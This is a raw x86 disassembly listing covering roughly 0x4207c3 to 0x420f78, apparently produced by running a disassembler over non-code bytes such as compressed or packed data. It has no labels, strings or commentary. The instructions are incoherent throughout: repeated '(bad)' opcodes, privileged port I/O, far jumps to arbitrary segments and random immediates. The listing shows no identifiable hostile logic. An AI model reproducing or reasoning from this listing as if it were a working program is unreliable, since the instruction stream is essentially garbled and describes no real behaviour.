  4207c3:	hlt    
  4207c4:	mov    cl,0x9d
  4207c6:	fdivr  QWORD PTR [ebx]
  4207c8:	cmovle esp,DWORD PTR [ebp*8-0xb831541]
  4207d0:	inc    ebx
  4207d2:	in     eax,dx
  4207d3:	in     eax,dx
  4207d4:	or     edi,DWORD PTR [edi+0x14592ccd]
  4207da:	pop    esp
  4207db:	test   eax,0x7fce4c0d
  4207e0:	jecxz  0x42084e
  4207e2:	xchg   BYTE PTR [esi+0x37],dl
  4207e5:	adc    al,BYTE PTR [ebx+0xb]
  4207e8:	daa    
  4207e9:	mov    WORD PTR [edx-0xd],es
  4207ec:	aas    
  4207ed:	jno    0x4207a2
  4207ef:	outs   dx,BYTE PTR ds:[esi]
  4207f0:	pop    ds
  4207f1:	leave  
  4207f2:	jb     0x420794
  4207f4:	xor    dh,dl
  4207f6:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207f8:	sahf   
  4207f9:	lock arpl bx,cx
  4207fc:	push   es
  4207fd:	int    0xda
  4207ff:	cmp    eax,0xa409a243
  420804:	mov    ebx,0x678c4171
  420809:	sub    eax,0xf1f2b177
  42080e:	loopne 0x420810
	...
  420818:	add    BYTE PTR [eax],al
  42081a:	ja     0x420868
  42081c:	idiv   dh
  42081e:	(bad)  
  42081f:	(bad)  
  420820:	jg     0x4207ef
  420822:	mul    BYTE PTR [ebx+0x46f92ffd]
  420828:	add    edx,DWORD PTR [edx+0x18505]
  42082e:	std    
  42082f:	add    DWORD PTR [eax],eax
  420831:	add    BYTE PTR [ecx-0x1c6b9b81],cl
  420837:	inc    ebx
  420838:	sub    DWORD PTR [ebx-0x7f],esp
  42083b:	adc    bl,ah
  42083d:	dec    ebx
  42083e:	push   edx
  42083f:	imul   ebx,esi,0xfffffff4
  420842:	pop    ss
  420843:	and    eax,DWORD PTR [ebx]
  420845:	add    ah,BYTE PTR [ebx+0x60274d16]
  42084b:	test   DWORD PTR [edx+0x3b],esi
  42084e:	nop
  42084f:	adc    BYTE PTR ds:0x10412900,ch
  420855:	sbb    bl,BYTE PTR ds:0xd130f4b9
  42085b:	mov    DWORD PTR [eax+0x78730578],esp
  420861:	inc    esp
  420862:	std    
  420863:	icebp  
  420864:	repz aas 
  420866:	add    BYTE PTR [eax],ah
  420868:	jns    0x4208b8
  42086a:	inc    ebx
  42086b:	imul   eax,DWORD PTR [esi-0x1ed8c36d],0x227da12f
  420875:	push   ebp
  420876:	retf   
  420877:	fild   QWORD PTR [eax]
  420879:	mov    ebx,0xe31a727d
  42087e:	fisttp WORD PTR [edi-0xe]
  420881:	shl    BYTE PTR [esi],1
  420883:	push   eax
  420884:	mov    eax,ds:0x5a46e476
  420889:	sahf   
  42088a:	fld    DWORD PTR [esi+ebx*8-0x30b7dab0]
  420891:	nop
  420892:	push   ecx
  420893:	scas   al,BYTE PTR es:[edi]
  420894:	ja     0x4208a0
  420896:	inc    edi
  420897:	cmp    ebp,DWORD PTR [ecx]
  420899:	xchg   edi,eax
  42089a:	cmp    DWORD PTR [edx],0x3a
  42089d:	outs   dx,BYTE PTR ds:[esi]
  42089e:	cmp    eax,0xde5fe3dc
  4208a3:	mov    dl,0x7d
  4208a5:	push   0x5a
  4208a7:	sub    al,0x46
  4208a9:	cmp    eax,0x37fb635f
  4208ae:	push   ebx
  4208af:	push   ss
  4208b0:	cmp    DWORD PTR ds:0x404459f4,edx
  4208b6:	jbe    0x42083e
  4208b8:	jg     0x420927
  4208ba:	mov    al,ds:0x5d3b7852
  4208bf:	dec    ecx
  4208c0:	and    eax,DWORD PTR [edx-0x7d]
  4208c3:	push   esp
  4208c4:	pop    ebx
  4208c5:	xor    edi,DWORD PTR [ebx-0x512b3a65]
  4208cb:	(bad)  
  4208cc:	xchg   esi,eax
  4208cd:	aad    0xb3
  4208cf:	pop    edi
  4208d0:	call   DWORD PTR ds:0x8b54f565
  4208d6:	mov    WORD PTR [edi],?
  4208d8:	bound  esp,QWORD PTR [edx+0x104f326f]
  4208de:	bound  eax,QWORD PTR [eax]
  4208e0:	jo     0x420954
  4208e2:	sar    BYTE PTR ds:0xb386f483,0x5d
  4208e9:	mov    dl,0x27
  4208eb:	daa    
  4208ec:	stc    
  4208ed:	dec    esi
  4208ee:	cld    
  4208ef:	ret    
  4208f0:	loope  0x420919
  4208f2:	mov    bh,dh
  4208f4:	and    al,0x13
  4208f6:	fist   WORD PTR [edx]
  4208f8:	sub    al,0x52
  4208fa:	cmp    al,0x2e
  4208fc:	mov    ecx,0x3bafee2
  420901:	mov    al,ds:0x1cd3d711
  420906:	adc    eax,0xff73cf50
  42090b:	push   esi
  42090c:	sub    ebp,esi
  42090e:	stos   DWORD PTR es:[edi],eax
  42090f:	xchg   esi,eax
  420910:	xor    al,0xbe
  420912:	mov    ecx,0x848a2cc6
  420917:	ds xchg ecx,eax
  420919:	mov    ebp,0x29e3c8e4
  42091e:	mov    dl,0xe
  420920:	iret   
  420921:	sub    eax,0x848bf565
  420926:	xchg   DWORD PTR [eax],edi
  420928:	fsubp  st(4),st
  42092a:	xchg   BYTE PTR [ecx-0x64],ah
  42092d:	xor    al,0x2a
  42092f:	cmp    BYTE PTR [ecx-0x1e],ch
  420932:	sub    al,0xe9
  420934:	ins    BYTE PTR es:[edi],dx
  420935:	sub    ecx,eax
  420937:	out    0x78,eax
  420939:	xor    bh,bh
  42093b:	(bad)  
  42093c:	aad    0x5d
  42093e:	popa   
  42093f:	es aaa 
  420941:	jae    0x42096a
  420943:	sbb    edi,eax
  420945:	sbb    al,0xf1
  420947:	push   esp
  420948:	mov    DWORD PTR [edx+0x29],0x3fee7123
  42094f:	and    eax,DWORD PTR [eax+0x2d3bec9b]
  420955:	sbb    cl,BYTE PTR [ebx-0xd]
  420958:	jo     0x42099b
  42095a:	jo     0x4209b9
  42095c:	adc    edx,DWORD PTR [eax+0x7b]
  42095f:	iretw  
  420961:	fs inc eax
  420963:	(bad)  
  420965:	imul   eax,DWORD PTR [esi],0x9d2f8ea8
  42096b:	pop    ss
  42096c:	gs je  0x42092e
  42096f:	dec    edi
  420970:	xchg   DWORD PTR [edx-0x75],ebp
  420973:	add    dl,BYTE PTR [esi]
  420975:	mov    bh,0x34
  420977:	scas   al,BYTE PTR es:[edi]
  420978:	and    al,0x6
  42097a:	dec    edi
  42097b:	int3   
  42097c:	mov    eax,0x8c3dc503
  420981:	mov    ds:0x51118964,eax
  420986:	mov    bh,0x71
  420988:	sbb    DWORD PTR [ebx+0x394227fe],esp
  42098e:	es mov ecx,0xf309815f
  420994:	dec    esp
  420995:	outs   dx,BYTE PTR ds:[esi]
  420996:	stos   BYTE PTR es:[edi],al
  420997:	test   BYTE PTR [esi],al
  420999:	cwde   
  42099a:	ds pop es
  42099c:	or     esi,DWORD PTR [eax-0x2f]
  42099f:	or     ch,BYTE PTR [ebp+0x5f]
  4209a2:	fdiv   DWORD PTR [edx+0x12665fc7]
  4209a8:	mov    edx,0x1a79e382
  4209ad:	inc    esi
  4209ae:	int3   
  4209af:	(bad)  
  4209b0:	push   esi
  4209b1:	dec    esi
  4209b2:	fs dec ebp
  4209b4:	mov    ah,0x5f
  4209b6:	jo     0x42094b
  4209b8:	mov    ebx,0x70a0ecfe
  4209bd:	ds sti 
  4209bf:	(bad)  
  4209c0:	cmp    DWORD PTR [edi],ebx
  4209c2:	(bad)  [eax]
  4209c4:	cmp    al,bl
  4209c6:	add    eax,0x166823e8
  4209cb:	ds stos BYTE PTR es:[edi],al
  4209cd:	outs   dx,BYTE PTR ds:[esi]
  4209ce:	add    dh,BYTE PTR [esi]
  4209d0:	jns    0x42098e
  4209d2:	call   0x6ff5:0xb67ed6c1
  4209d9:	call   0x7f7a:0xa94db164
  4209e0:	pop    esi
  4209e1:	and    eax,0x859c4a86
  4209e6:	test   al,0x1c
  4209e8:	lahf   
  4209e9:	mov    ds:0x69f67c86,al
  4209ee:	mov    cs,WORD PTR [ecx+0x1e]
  4209f1:	sub    DWORD PTR ds:0xb65a0956,0x57f8e7b5
  4209fb:	aam    0xb3
  4209fd:	pop    ecx
  4209fe:	cmp    BYTE PTR [edi-0x7b],dl
  420a01:	test   BYTE PTR [edx+0x62303336],0xa3
  420a08:	ret    0x449c
  420a0b:	imul   eax,DWORD PTR [ebx+0x2a],0xf0f88354
  420a12:	test   DWORD PTR [esi-0x5f],esi
  420a15:	pop    ss
  420a16:	or     BYTE PTR [edi+0x79],0xfb
  420a1a:	outs   dx,BYTE PTR ds:[esi]
  420a1b:	sub    ebx,DWORD PTR [edx]
  420a1d:	xchg   BYTE PTR [ebx+0x3b],dh
  420a20:	push   ds
  420a21:	mov    edx,0x5df1936b
  420a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a27:	imul   esp,DWORD PTR [esi-0x71a41167],0x25
  420a2e:	int    0x0
	...
  420a38:	add    BYTE PTR [eax],al
  420a3a:	pop    es
  420a3b:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  420a41:	pop    ds
  420a42:	(bad)  
  420a44:	std    
  420a45:	jg     0x420a66
  420a47:	fmul   DWORD PTR ds:0x18702d8
  420a4d:	add    ch,bh
  420a4f:	add    DWORD PTR [eax],eax
  420a51:	add    BYTE PTR [edi],dl
  420a53:	arpl   WORD PTR [edx-0x1],bx
  420a56:	xor    al,0xde
  420a58:	push   ebp
  420a59:	mov    ds:0x21dc8a7a,al
  420a5e:	jle    0x420a2c
  420a60:	je     0x420ab3
  420a62:	shl    DWORD PTR gs:[edi+0x52],cl
  420a66:	jbe    0x420ad9
  420a68:	pop    ebp
  420a69:	imul   ebp,DWORD PTR [edi-0x44],0x7f
  420a6d:	out    dx,eax
  420a6e:	push   edx
  420a6f:	or     DWORD PTR [esi+0x23f31276],eax
  420a75:	mov    ah,0xca
  420a77:	cmp    BYTE PTR ds:0x28e03eb,dh
  420a7d:	push   ebx
  420a7e:	pusha  
  420a7f:	stc    
  420a80:	jbe    0x420af4
  420a82:	imul   esi,DWORD PTR [ebp-0xf],0x46
  420a86:	dec    esp
  420a87:	xchg   esi,eax
  420a88:	sbb    al,0xf2
  420a8a:	test   eax,0x660817b7
  420a8f:	jecxz  0x420a5d
  420a91:	jae    0x420a5d
  420a93:	shl    DWORD PTR [esi-0x22],cl
  420a96:	or     al,0xec
  420a98:	gs sub cl,ch
  420a9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a9c:	push   ebp
  420a9d:	fld    DWORD PTR [eax-0x3b]
  420aa0:	pusha  
  420aa1:	pop    edi
  420aa2:	out    0xff,eax
  420aa4:	and    dl,BYTE PTR [ebx-0x8]
  420aa7:	xor    edi,DWORD PTR [ecx+ebp*8-0x8]
  420aab:	popa   
  420aac:	lea    ebp,[ecx-0x2d0d29b9]
  420ab2:	push   ecx
  420ab3:	pop    esi
  420ab4:	and    DWORD PTR [ebx+0x6a7cacdb],0xf4167af2
  420abe:	and    eax,DWORD PTR [eax-0x3f]
  420ac1:	fmul   st,st(0)
  420ac3:	lds    esp,FWORD PTR [edx+ecx*4+0x44]
  420ac7:	scas   eax,DWORD PTR es:[edi]
  420ac8:	xchg   esp,eax
  420ac9:	rcl    DWORD PTR [ebx],0x47
  420acc:	pushf  
  420acd:	fist   WORD PTR [eax]
  420acf:	mov    ds:0xb7cef522,al
  420ad4:	aad    0x8
  420ad6:	ror    BYTE PTR [ebx-0x14],cl
  420ad9:	call   0x3920:0x9d0b6f7c
  420ae0:	dec    eax
  420ae1:	xchg   DWORD PTR [ecx-0x30],ebx
  420ae4:	imul   edx,DWORD PTR [ebp-0x522128b5],0x27
  420aeb:	and    DWORD PTR [ebx-0x65],esp
  420aee:	cmp    bh,ch
  420af0:	mov    al,ds:0xe32fd41f
  420af5:	pop    es
  420af6:	ds push ebp
  420af8:	dec    ebp
  420af9:	sub    DWORD PTR [ecx],0xeedcf84
  420aff:	mov    cl,0x93
  420b01:	ret    0x3f6d
  420b04:	cdq    
  420b05:	leave  
  420b06:	mov    eax,ds:0x13a27b2f
  420b0b:	or     BYTE PTR [ebp-0x1c],ah
  420b0e:	adc    BYTE PTR [esp+ebx*4],dh
  420b11:	ds imul eax,eax,0x7e70f44b
  420b18:	(bad)  
  420b19:	push   edx
  420b1a:	pop    ebx
  420b1b:	in     al,0x72
  420b1d:	ret    0xc0e6
  420b20:	pop    ebx
  420b21:	push   cs
  420b22:	xchg   ebp,eax
  420b23:	out    dx,eax
  420b24:	ret    0xbe53
  420b27:	xchg   ecx,eax
  420b28:	out    0x48,al
  420b2a:	or     al,0xdb
  420b2c:	imul   eax,DWORD PTR [esi+0x40],0xc
  420b30:	dec    ebp
  420b31:	adc    cl,BYTE PTR [esi-0x69]
  420b34:	out    dx,al
  420b35:	in     eax,dx
  420b36:	out    dx,eax
  420b37:	sbb    BYTE PTR [edx+0x7c],dl
  420b3a:	shl    DWORD PTR [edi],0x5b
  420b3d:	add    al,0xad
  420b3f:	cmovbe ebp,eax
  420b42:	jae    0x420b7d
  420b44:	lock sub al,0x89
  420b47:	clc    
  420b48:	xor    ecx,esp
  420b4a:	mov    ecx,0x1d5c675b
  420b4f:	aam    0xcb
  420b51:	aad    0x31
  420b53:	jnp    0x420b20
  420b55:	iret   
  420b56:	inc    edi
  420b57:	mov    esp,0x93de62d0
  420b5c:	inc    esi
  420b5d:	sbb    ch,dl
  420b5f:	sbb    al,0x92
  420b61:	shr    ebp,0x20
  420b64:	ret    
  420b65:	push   ebx
  420b66:	mov    dh,0xea
  420b68:	stos   DWORD PTR es:[edi],eax
  420b69:	mov    al,0xc0
  420b6b:	inc    esi
  420b6c:	scas   al,BYTE PTR es:[edi]
  420b6d:	pop    esi
  420b6e:	pop    es
  420b6f:	push   0x77ee0c04
  420b74:	ret    0x649d
  420b77:	and    DWORD PTR [edi+0x6574cdd0],ecx
  420b7d:	xchg   esp,eax
  420b7e:	stc    
  420b7f:	add    al,0xae
  420b81:	mov    BYTE PTR [ecx],ch
  420b83:	shr    BYTE PTR [eax+0x4c335928],0xc3
  420b8a:	das    
  420b8b:	xor    BYTE PTR [eax],dh
  420b8d:	xchg   DWORD PTR [ebp-0x1a],edi
  420b90:	sub    ebp,DWORD PTR [ecx+edi*1-0x36]
  420b94:	mov    dl,0x5
  420b96:	imul   esp,DWORD PTR [eax],0xd
  420b99:	xor    DWORD PTR [edi+0x29878c4a],0x2f
  420ba0:	push   ecx
  420ba1:	and    al,0x22
  420ba3:	adc    DWORD PTR [ebp-0x76],ebp
  420ba6:	sti    
  420ba7:	jbe    0x420b6a
  420ba9:	lock outs dx,BYTE PTR ds:[esi]
  420bab:	pop    es
  420bac:	mov    edx,0x897cf8f7
  420bb1:	jge    0x420bbb
  420bb3:	shl    DWORD PTR [esi+0x2],0x5a
  420bb7:	xchg   ebx,eax
  420bb8:	test   BYTE PTR [esi],bl
  420bba:	fwait
  420bbb:	and    al,0x9d
  420bbd:	add    BYTE PTR [ecx+0x4cb6ef1e],cl
  420bc3:	pop    ds
  420bc4:	pop    esi
  420bc5:	out    dx,eax
  420bc6:	lahf   
  420bc7:	inc    eax
  420bc8:	stos   DWORD PTR es:[edi],eax
  420bc9:	xchg   edx,eax
  420bca:	not    al
  420bcc:	adc    al,0xac
  420bce:	pop    eax
  420bcf:	sbb    ecx,DWORD PTR [edi]
  420bd1:	je     0x420c11
  420bd3:	sub    edx,edi
  420bd5:	cmp    eax,0xe1f6fa6f
  420bda:	push   esp
  420bdb:	stc    
  420bdc:	push   cs
  420bdd:	hlt    
  420bde:	xchg   edx,eax
  420bdf:	gs mov esi,0xb1b30717
  420be5:	inc    ebx
  420be6:	imul   edi,DWORD PTR [edx+0x3],0x97c989ed
  420bed:	pop    ss
  420bee:	imul   ebp,eax,0xda1f1226
  420bf4:	sti    
  420bf5:	jmp    0xd6e4079c
  420bfa:	fwait
  420bfb:	cdq    
  420bfc:	sub    eax,0x45f730ae
  420c01:	outs   dx,DWORD PTR ds:[esi]
  420c02:	fidivr DWORD PTR [esi+0x6f]
  420c05:	jg     0x420c43
  420c07:	test   al,0x85
  420c09:	push   edi
  420c0a:	mov    ch,0xe5
  420c0c:	push   ds
  420c0d:	pop    ds
  420c0e:	repz sub eax,0x74d66786
  420c14:	sub    al,0x11
  420c16:	mov    ah,0xd0
  420c18:	gs push ebx
  420c1a:	lods   eax,DWORD PTR ds:[esi]
  420c1b:	push   esp
  420c1c:	retf   
  420c1d:	adc    DWORD PTR [ecx+edx*1+0x66],esp
  420c21:	mov    BYTE PTR [eax-0x79],bl
  420c24:	popf   
  420c25:	and    al,0x7
  420c27:	mov    ds:0x6e1d3ef9,eax
  420c2c:	and    bl,cl
  420c2e:	sbb    ebp,ecx
  420c30:	cmp    BYTE PTR [eax+0x48],bl
  420c33:	imul   edi,DWORD PTR [ecx-0x79],0x223aab3
  420c3a:	jecxz  0x420c48
  420c3c:	inc    edi
  420c3d:	pop    ss
  420c3e:	add    DWORD PTR [eax+0x42b01818],0x4b54dc0c
  420c48:	test   eax,0x7b7d95e2
  420c4d:	jmp    DWORD PTR [ebx]
	...
  420c57:	add    BYTE PTR [eax],al
  420c59:	add    BYTE PTR [esi],bl
  420c5b:	add    al,0xa7
  420c5d:	(bad)  
  420c5e:	mov    edi,0x7bdd7ee7
  420c63:	int    0x75
  420c65:	mov    WORD PTR [eax-0x13f0a0],es
  420c6b:	mov    BYTE PTR [ecx],al
  420c6d:	add    ch,bh
  420c6f:	add    DWORD PTR [eax],eax
  420c71:	add    BYTE PTR [edx-0x2a546259],al
  420c77:	pusha  
  420c78:	xor    BYTE PTR [edi-0x74],bl
  420c7b:	sbb    BYTE PTR [ebx],dl
  420c7d:	cld    
  420c7e:	push   0x11
  420c80:	pop    edi
  420c81:	xor    dl,al
  420c83:	fmul   QWORD PTR ds:0xc50a7e8d
  420c89:	sub    al,BYTE PTR [bp+0x6f0c]
  420c8e:	pop    ds
  420c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c90:	sbb    eax,edx
  420c92:	pop    es
  420c93:	ds iret 
  420c95:	pop    edx
  420c96:	or     al,0xa3
  420c98:	mov    ah,0xef
  420c9a:	adc    DWORD PTR [ebp+esi*4-0xf6ae296],ecx
  420ca1:	adc    al,0xf1
  420ca3:	push   ss
  420ca4:	fild   WORD PTR [edi]
  420ca6:	sahf   
  420ca7:	fst    QWORD PTR [edx]
  420ca9:	fcomi  st,st(7)
  420cab:	in     al,0xa0
  420cad:	mov    ch,0xfe
  420caf:	frstor [ecx]
  420cb1:	ins    BYTE PTR es:[edi],dx
  420cb2:	outs   dx,DWORD PTR ds:[esi]
  420cb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cb4:	xchg   edx,eax
  420cb5:	inc    ebp
  420cb6:	std    
  420cb7:	sbb    bl,BYTE PTR es:[eax]
  420cba:	std    
  420cbb:	arpl   si,di
  420cbd:	int    0x7e
  420cbf:	jbe    0x420c8f
  420cc1:	inc    ebx
  420cc2:	push   esi
  420cc3:	test   BYTE PTR [edi+0x24],bl
  420cc6:	sbb    DWORD PTR [esi+0x5baca2a8],ebx
  420ccc:	adc    eax,0xf5c8e5b5
  420cd1:	push   ss
  420cd2:	pop    es
  420cd3:	xchg   edi,eax
  420cd4:	push   edx
  420cd5:	mov    ebp,0x6f17eacf
  420cda:	test   BYTE PTR [edi+0x3a18fcc0],al
  420ce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ce1:	sbb    edi,eax
  420ce3:	(bad)  
  420ce4:	loope  0x420d33
  420ce6:	mov    ch,0xf5
  420ce8:	fs push 0x66c087d
  420cee:	pop    ss
  420cef:	jns    0x420d25
  420cf1:	popf   
  420cf2:	mov    esp,DWORD PTR [edi-0x5e]
  420cf5:	push   edx
  420cf6:	fs adc al,0x87
  420cf9:	aad    0xef
  420cfb:	jb     0x420d65
  420cfd:	int    0x8b
  420cff:	push   esi
  420d00:	mov    al,ds:0xeb093644
  420d05:	(bad)  
  420d06:	or     al,0x1b
  420d08:	daa    
  420d09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d0a:	inc    ecx
  420d0b:	popa   
  420d0c:	sbb    eax,0x2a316f9b
  420d11:	mov    eax,ds:0xf64ce95f
  420d16:	jle    0x420d10
  420d18:	sub    dl,BYTE PTR [ecx-0x5a]
  420d1b:	mov    ds:0x8f31a98b,al
  420d20:	mov    BYTE PTR [ecx],bh
  420d22:	pop    ss
  420d23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d24:	xor    eax,0x42650cd5
  420d29:	push   esi
  420d2a:	pop    edi
  420d2b:	sub    BYTE PTR es:[edi],dl
  420d2e:	push   esp
  420d2f:	cmp    DWORD PTR [eax-0x7b606b02],edi
  420d35:	leave  
  420d36:	fwait
  420d37:	pop    ecx
  420d38:	push   esp
  420d39:	cmc    
  420d3a:	sub    al,0x6f
  420d3c:	push   edx
  420d3d:	outs   dx,BYTE PTR ds:[esi]
  420d3e:	test   DWORD PTR [eax+0x55624cac],eax
  420d44:	dec    ebx
  420d45:	mov    al,ds:0x452921cb
  420d4a:	push   edi
  420d4b:	sti    
  420d4c:	test   DWORD PTR [ebx],esi
  420d4e:	aaa    
  420d4f:	push   edx
  420d50:	adc    BYTE PTR fs:0x21f98941,0xe6
  420d58:	gs pop ebx
  420d5a:	imul   esp,ebx,0xce14c3f9
  420d60:	and    al,0x64
  420d62:	mov    cl,0xb8
  420d64:	stos   DWORD PTR es:[edi],eax
  420d65:	stos   DWORD PTR es:[edi],eax
  420d66:	or     DWORD PTR [ebx-0x343d5258],eax
  420d6c:	das    
  420d6d:	pushf  
  420d6e:	mov    al,ds:0xd633ae2
  420d73:	call   0x8d0c1f2d
  420d78:	lahf   
  420d79:	pop    edx
  420d7a:	adc    ah,BYTE PTR [ebx-0x7f0485fb]
  420d80:	retf   
  420d81:	jge    0x420d5d
  420d83:	dec    ecx
  420d84:	sub    edx,esp
  420d86:	in     eax,dx
  420d87:	fmulp  st(6),st
  420d89:	inc    eax
  420d8a:	mov    ecx,0x741a2f1e
  420d8f:	loop   0x420d45
  420d91:	mov    edi,0x517d5a77
  420d96:	in     al,dx
  420d97:	xor    DWORD PTR [ecx],0x4
  420d9a:	out    0xa7,al
  420d9c:	inc    edx
  420d9d:	jle    0x420d55
  420d9f:	sub    ah,bl
  420da1:	hlt    
  420da2:	and    al,bh
  420da4:	shr    DWORD PTR [ebx],1
  420da6:	xchg   ebx,eax
  420da7:	cld    
  420da8:	cwde   
  420da9:	test   eax,0x487007e
  420dae:	or     ah,ch
  420db0:	jmp    0x420d5a
  420db2:	bound  edx,QWORD PTR [esi+0x30]
  420db5:	fsub   DWORD PTR [esi-0x539976d4]
  420dbb:	cli    
  420dbc:	in     eax,dx
  420dbd:	push   ebx
  420dbe:	or     BYTE PTR [ebx+esi*2],bl
  420dc1:	mov    al,ds:0x5558200
  420dc6:	call   0x702354e9
  420dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dcc:	xor    eax,0xbd747938
  420dd1:	fwait
  420dd2:	scas   eax,DWORD PTR es:[edi]
  420dd3:	jecxz  0x420dfe
  420dd5:	pop    ss
  420dd6:	sbb    eax,0xa3989d2e
  420ddb:	arpl   WORD PTR [esi-0x715f3892],bx
  420de1:	cmp    al,0xbc
  420de3:	(bad)  
  420de4:	and    eax,0x97b5bb9d
  420de9:	scas   al,BYTE PTR es:[edi]
  420dea:	pushf  
  420deb:	pop    ss
  420dec:	stc    
  420ded:	ret    
  420dee:	mov    ebp,0xf65558f5
  420df3:	and    BYTE PTR [ebx+0x5a],al
  420df6:	sub    DWORD PTR [ebx-0x2530efc7],0xb1af1f7c
  420e00:	sbb    al,0x26
  420e02:	(bad)  
  420e03:	leave  
  420e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e05:	inc    esi
  420e06:	cld    
  420e07:	cmp    al,0xba
  420e09:	retf   0x2925
  420e0c:	xor    DWORD PTR [ebx+0x5d],0x1f4c3640
  420e13:	sbb    eax,0x29863b9a
  420e18:	sub    al,0xc5
  420e1a:	dec    ebx
  420e1b:	into   
  420e1c:	jmp    0x1eb4:0xc11cc9e
  420e23:	retf   0x7599
  420e26:	and    dh,BYTE PTR [eax*4+0x1e567911]
  420e2d:	es pop edx
  420e2f:	mov    dl,0x83
  420e31:	popa   
  420e32:	std    
  420e33:	popf   
  420e34:	mov    ds:0x7636ac9e,al
  420e39:	cmp    al,0x8f
  420e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e3c:	add    BYTE PTR [edx+0x21ebaff0],bl
  420e42:	add    DWORD PTR [ebp-0x7c],0xa870dc40
  420e49:	jmp    0x1f01eb49
  420e4e:	scas   al,BYTE PTR es:[edi]
  420e4f:	in     eax,0x4f
  420e51:	retf   
  420e52:	lahf   
  420e53:	outs   dx,DWORD PTR ds:[esi]
  420e54:	jno    0x420ed2
  420e56:	mov    edx,0x67ecc3fe
  420e5b:	fwait
  420e5c:	scas   al,BYTE PTR es:[edi]
  420e5d:	cmp    BYTE PTR [ebx-0x328264ec],al
  420e63:	clc    
  420e64:	repnz mov cl,cl
  420e67:	push   0xffffffe3
  420e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e6a:	ffree  st(1)
  420e6c:	jle    0x420e95
  420e6e:	cmp    al,BYTE PTR [eax]
	...
  420e78:	add    BYTE PTR [eax],al
  420e7a:	js     0x420e05
  420e7c:	hlt    
  420e7d:	mov    al,0xf5
  420e7f:	std    
  420e80:	jl     0x420e4b
  420e82:	xor    dl,0x39
  420e85:	jg     0x420e39
  420e87:	icebp  
  420e88:	add    al,0x2d
  420e8a:	cld    
  420e8b:	mov    al,BYTE PTR [ecx]
  420e8d:	add    ch,bh
  420e8f:	add    DWORD PTR [eax],eax
  420e91:	add    BYTE PTR [eax+edx*8-0x303c6aa1],bh
  420e98:	xchg   edi,eax
  420e99:	and    DWORD PTR [esi+0x429ba64f],0xffffffd9
  420ea0:	adc    DWORD PTR [ecx+0x7],ecx
  420ea3:	scas   al,BYTE PTR es:[edi]
  420ea4:	push   ss
  420ea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ea6:	adc    BYTE PTR [eax],bh
  420ea8:	pop    ebp
  420ea9:	push   es
  420eaa:	mov    edx,0x8c85bc40
  420eaf:	jle    0x420e9a
  420eb1:	sub    bh,BYTE PTR [ecx]
  420eb3:	push   esp
  420eb4:	aam    0x76
  420eb6:	cmp    al,0xb2
  420eb8:	xlat   BYTE PTR ds:[ebx]
  420eb9:	jns    0x420ea8
  420ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ebc:	lods   eax,DWORD PTR ds:[esi]
  420ebd:	aad    0xae
  420ebf:	je     0x420f2e
  420ec1:	sub    ah,BYTE PTR [edi]
  420ec3:	fwait
  420ec4:	push   ebx
  420ec5:	sub    al,0x51
  420ec7:	cmc    
  420ec8:	shl    BYTE PTR [ecx-0x51],0xc4
  420ecc:	aam    0x6d
  420ece:	loop   0x420eea
  420ed0:	xor    DWORD PTR [edx+edi*8+0x389acf24],ecx
  420ed7:	fwait
  420ed8:	mov    WORD PTR [edi+0x9],fs
  420edb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420edc:	pop    ecx
  420edd:	or     al,0x34
  420edf:	into   
  420ee0:	cmp    eax,0x94deaab8
  420ee5:	sub    BYTE PTR [ecx-0x4a0c6aa1],ah
  420eeb:	ins    BYTE PTR es:[edi],dx
  420eec:	loope  0x420ec4
  420eee:	push   eax
  420eef:	shl    DWORD PTR [eax-0x564329b1],1
  420ef5:	push   esi
  420ef6:	pop    ds
  420ef7:	mov    bh,0x80
  420ef9:	out    dx,eax
  420efa:	sub    ecx,0xffffff9d
  420efd:	xor    bh,ch
  420eff:	std    
  420f00:	sbb    ah,BYTE PTR [esi-0x15]
  420f03:	and    esi,DWORD PTR [ebp+0x2c]
  420f06:	stc    
  420f07:	adc    eax,0xeefc02b4
  420f0c:	inc    ecx
  420f0d:	and    eax,0x21e48f38
  420f12:	pop    ss
  420f13:	fbstp  TBYTE PTR [esi-0x590f4867]
  420f19:	dec    edi
  420f1a:	(bad)  
  420f1b:	bound  ecx,QWORD PTR [edx+0x5e19df8a]
  420f21:	and    al,0x95
  420f23:	jno    0x420f67
  420f25:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  420f27:	jnp    0x420f40
  420f29:	cmp    BYTE PTR [edx+0x43],cl
  420f2c:	adc    edi,edi
  420f2e:	(bad)  
  420f2f:	mov    eax,0x43ba083f
  420f34:	jns    0x420f2e
  420f36:	mov    WORD PTR [esi+0x4928f169],?
  420f3c:	xor    eax,esp
  420f3e:	dec    ecx
  420f3f:	fcom   DWORD PTR [ecx+0x38]
  420f42:	fdiv   DWORD PTR [edi-0x3a7b5166]
  420f48:	xor    al,0x17
  420f4a:	inc    esp
  420f4b:	out    0xdb,eax
  420f4d:	out    dx,eax
  420f4e:	push   ebp
  420f4f:	in     eax,dx
  420f50:	cwde   
  420f51:	xchg   esi,eax
  420f52:	add    ch,cl
  420f54:	(bad)  
  420f55:	or     al,0x6
  420f57:	mov    cl,BYTE PTR [ebx-0x22]
  420f5a:	popf   
  420f5b:	sbb    eax,0x72e01c15
  420f60:	int    0x73
  420f62:	mov    ebp,0x9599a716
  420f67:	mov    ah,0x12
  420f69:	imul   edi,DWORD PTR [edx+0x650fdb3a],0xd4b5a4d3
  420f73:	push   esp
  420f74:	xor    dh,ch
  420f76:	in     eax,dx
  420f77:	xchg   ecx,eax
  420f78:	sub    ecx,DWORD PTR es:[ebp-0x3f]
